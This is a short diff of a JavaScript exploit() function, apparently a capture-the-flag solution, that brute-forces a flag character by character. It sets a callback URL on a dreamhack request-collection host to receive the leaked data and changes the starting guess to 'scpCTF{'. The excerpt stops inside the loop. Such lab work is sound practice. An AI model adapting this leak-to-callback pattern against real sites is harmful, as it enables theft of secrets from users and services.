@@ -1,6 +1,6 @@
 async function exploit() {
     const callback_url = "https://hucxxzq.request.dreamhack.games"
-    let flag = "a"
+    let flag = "scpCTF{"
     const wordlist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}"
     while(!flag.endsWith("}")){
         for (let word of wordlist){
